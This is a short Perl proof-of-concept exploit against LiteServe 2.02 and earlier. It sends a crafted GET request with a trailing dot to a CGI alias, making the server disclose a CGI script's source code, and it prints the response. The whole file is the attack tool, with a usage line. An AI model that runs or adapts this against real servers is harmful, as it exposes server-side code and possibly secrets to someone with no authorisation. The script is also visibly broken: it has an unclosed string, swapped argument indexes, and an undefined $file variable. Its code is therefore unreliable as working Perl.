#!/usr/bin/perl
#
# LS_FETCH.PL
# By Matthew Murphy
# LiteServe 2.02 and prior - CGI Disclosure
# Usage: perl ls_fetch.pl [filename] [host] [alias] [port]
use IO::Socket;
use URI::Escape;

$alias = "cgi-isapi"; # Default LiteServe CGI alias
$port = 80;
if (@ARGV < 2 || @ARGV > 4) {
print STDOUT "Usage: perl $0 [filename] [host] [alias=cgi-isapi] [port=80]
} else {
if (@ARGV >= 3) {
$alias = $ARGV[2];
}
if (@ARGV == 4) {
$port = $ARGV[3];
}
$filename = $ARGV[1];
$host = $ARGV[2];
$f = IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Proto=>"tcp");
$f->autoflush(1);
$b = sprintf("GET /%s/%s. HTTP/1.0\r\n\r\n", $alias, uri_escape($file));
print $f $b;
while (defined($line=<$f>)) {
print STDOUT $line;
}
undef $f;
}

